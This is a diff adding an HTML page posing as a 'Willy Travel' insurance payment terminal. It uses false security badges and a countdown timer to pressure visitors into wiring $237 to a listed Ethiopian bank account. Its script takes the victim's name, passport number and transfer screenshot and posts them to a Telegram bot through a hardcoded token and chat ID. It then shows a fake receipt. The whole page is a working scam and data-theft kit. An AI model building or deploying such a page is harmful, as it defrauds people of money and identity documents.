@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Willy Travel | Global Insurance Terminal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Lexend:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-navy: #0f172a;
+            --accent-gold: #c5a059;
+            --trust-blue: #2563eb;
+            --success-green: #059669;
+            --error-red: #dc2626;
+            --bg-gray: #f8fafc;
+        }
+
+        body {
+            background-color: #e2e8f0;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .official-container {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            min-height: 100vh;
+            box-shadow: 0 0 50px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Security Bar */
+        .security-ribbon {
+            background: var(--primary-navy);
+            color: #fff;
+            padding: 10px;
+            font-size: 10px;
+            text-align: center;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Live Support Status */
+        .status-bar {
+            background: #f1f5f9;
+            padding: 8px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .live-dot {
+            height: 8px;
+            width: 8px;
+            background-color: var(--success-green);
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        .brand-section {
+            padding: 30px 25px 15px;
+            text-align: center;
+        }
+        .brand-section h1 {
+            font-family: 'Lexend', sans-serif;
+            font-weight: 800;
+            font-size: 26px;
+            color: var(--primary-navy);
+            margin: 0;
+        }
+
+        .amount-card {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            color: white;
+            margin: 10px 25px 20px;
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .amount-card span { font-size: 11px; text-transform: uppercase; opacity: 0.7; letter-spacing: 1px; }
+        .amount-card h2 { font-size: 38px; margin: 5px 0; font-family: 'Lexend'; color: #fff; }
+        
+        /* Countdown Timer */
+        .timer-box {
+            font-size: 11px;
+            background: rgba(255,255,255,0.1);
+            padding: 4px 12px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .bank-details {
+            margin: 0 25px 25px;
+            padding: 15px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            background: #fff;
+        }
+        .bank-label { font-size: 10px; font-weight: 800; color: var(--trust-blue); margin-bottom: 5px; display: block; }
+        .acc-row { display: flex; justify-content: space-between; align-items: center; }
+        .acc-num { font-family: 'Lexend'; font-size: 18px; font-weight: 700; color: var(--primary-navy); }
+        .copy-link { color: var(--trust-blue); font-size: 11px; cursor: pointer; font-weight: 700; text-decoration: underline; }
+
+        .form-section { padding: 0 25px 30px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-size: 11px; font-weight: 700; color: #475569; margin-bottom: 6px; text-transform: uppercase; }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #f1f5f9;
+            background: #f8fafc;
+            border-radius: 10px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: all 0.3s;
+        }
+        input:focus { border-color: var(--trust-blue); outline: none; background: #fff; }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--trust-blue);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+        }
+
+        .trust-footer {
+            text-align: center;
+            padding: 20px;
+            opacity: 0.6;
+            font-size: 10px;
+        }
+
+        /* Success Terminal */
+        #successTerminal { display: none; padding: 40px 25px; text-align: center; }
+        .receipt-paper {
+            background: #fff;
+            padding: 25px;
+            border: 1px solid #ddd;
+            text-align: left;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .receipt-paper::before {
+            content: "";
+            position: absolute;
+            top: -10px; left: 0; right: 0;
+            height: 10px;
+            background: linear-gradient(-45deg, transparent 5px, white 5px), linear-gradient(45deg, transparent 5px, white 5px);
+            background-size: 10px 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="official-container">
+    <div class="security-ribbon">
+        🔒 Encrypted Session (AES-256) • Secure Payment Terminal
+    </div>
+
+    <div class="status-bar">
+        <span style="font-size: 11px; color: #64748b;">Terminal ID: #WT-772</span>
+        <span style="font-size: 11px; font-weight: 600;"><span class="live-dot"></span> Server Online</span>
+    </div>
+
+    <div id="paymentView">
+        <div class="brand-section">
+            <h1>Willy Travel</h1>
+            <p style="margin: 5px 0 0; font-size: 12px; color: var(--accent-gold); font-weight: 700; letter-spacing: 2px;">INSURANCE DEPT.</p>
+        </div>
+
+        <div class="amount-card">
+            <span>Insurance Settlement Due</span>
+            <h2>$237.00</h2>
+            <div class="timer-box">
+                Quote expires in: <span id="timer">14:59</span>
+            </div>
+        </div>
+
+        <div class="bank-details">
+            <span class="bank-label">OFFICIAL RECEIVING BANK (ETHIOPIA)</span>
+            <div class="acc-row">
+                <span class="acc-num">1000594008182</span>
+                <span class="copy-link" onclick="copyNum()">COPY</span>
+            </div>
+            <p style="margin: 8px 0 0; font-size: 10px; color: #94a3b8;">Commercial Bank of Ethiopia • Main Branch</p>
+        </div>
+
+        <div class="form-section">
+            <form id="insuranceForm">
+                <div class="input-group">
+                    <label>Full Name (as per Passport)</label>
+                    <input type="text" id="name" placeholder="John Doe" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Passport Number / ID</label>
+                    <input type="text" id="passport" placeholder="Optional for faster processing">
+                </div>
+
+                <div class="input-group">
+                    <label>Proof of Transfer (Screenshot/Photo)</label>
+                    <input type="file" id="slip" accept="image/*" required style="border:none; padding-left: 0; background:none;">
+                </div>
+
+                <button type="submit" class="submit-btn" id="subBtn">PROCESS INSURANCE FILING</button>
+            </form>
+        </div>
+
+        <div class="trust-footer">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal_MasterCard_Visa_American_Express_logo.png" width="120" style="filter: grayscale(1); margin-bottom: 10px;"><br>
+            Verified Merchant • Licensed Travel Agency • ISO 27001 Certified
+        </div>
+    </div>
+
+    <div id="successTerminal">
+        <div style="background: var(--success-green); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h2 style="margin-bottom: 5px;">PAYMENT SUBMITTED</h2>
+        <p style="color: #64748b; font-size: 14px; margin-top: 0;">Your policy is being generated...</p>
+
+        <div class="receipt-paper">
+            <p style="text-align: center; border-bottom: 1px dashed #000; padding-bottom: 10px; font-weight: bold;">WILLY TRAVEL INSURANCE ADVICE</p>
+            <div style="font-size: 12px; line-height: 2;">
+                <strong>REF ID:</strong> <span id="rRef"></span><br>
+                <strong>INSURED:</strong> <span id="rName"></span><br>
+                <strong>PREMIUM:</strong> $237.00<br>
+                <strong>STATUS:</strong> <span style="color: var(--trust-blue); font-weight: bold;">WAITING VERIFICATION</span><br>
+                <strong>POLICY:</strong> TRAVEL-GLOBE-2026
+            </div>
+            <div style="margin-top: 20px; border-top: 1px solid #eee; padding-top: 10px; text-align: center; font-size: 10px; color: #888;">
+                Please keep this receipt until you receive your PDF policy via email.
+            </div>
+        </div>
+        
+        <button onclick="window.print()" style="margin-top: 30px; width: 100%; padding: 15px; border-radius: 10px; background: #000; color: #fff; border: none; font-weight: 700;">DOWNLOAD RECEIPT</button>
+    </div>
+</div>
+
+<script>
+    // Timer Logic
+    let time = 899;
+    const timerEl = document.getElementById('timer');
+    setInterval(() => {
+        const mins = Math.floor(time / 60);
+        const secs = time % 60;
+        timerEl.innerHTML = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        if(time > 0) time--;
+    }, 1000);
+
+    function copyNum() {
+        navigator.clipboard.writeText("1000594008182");
+        alert("Account Number Copied");
+    }
+
+    const FORM = document.getElementById('insuranceForm');
+    const TOKEN = '8217952397:AAFd50O6KMj9K9b3hmM7_ar6QGb9FCkp9fY';
+    const CHAT_ID = '7574183318';
+
+    FORM.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const subBtn = document.getElementById('subBtn');
+        subBtn.innerText = "AUTHENTICATING...";
+        subBtn.disabled = true;
+
+        const name = document.getElementById('name').value;
+        const pass = document.getElementById('passport').value || "N/A";
+        const file = document.getElementById('slip').files[0];
+        const ref = "WT-INS-" + Math.floor(Math.random() * 900000 + 100000);
+
+        const caption = `🛡 *NEW INSURANCE SETTLEMENT*\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `👤 *CLIENT:* ${name.toUpperCase()}\n` +
+                        `🆔 *PASS/ID:* ${pass}\n` +
+                        `💰 *AMOUNT:* $237.00\n` +
+                        `📄 *REF ID:* ${ref}\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ *Action:* Generate Policy for Client`;
+
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', file);
+        fd.append('caption', caption);
+        fd.append('parse_mode', 'Markdown');
+
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            if(res.ok) {
+                document.getElementById('paymentView').style.display = 'none';
+                document.getElementById('successTerminal').style.display = 'block';
+                document.getElementById('rName').innerText = name.toUpperCase();
+                document.getElementById('rRef').innerText = ref;
+            }
+        } catch (err) {
+            alert("Security Error. Check connection.");
+            subBtn.disabled = false;
+            subBtn.innerText = "RETRY SUBMISSION";
+        }
+    });
+</script>
+
+</body>
+</html>
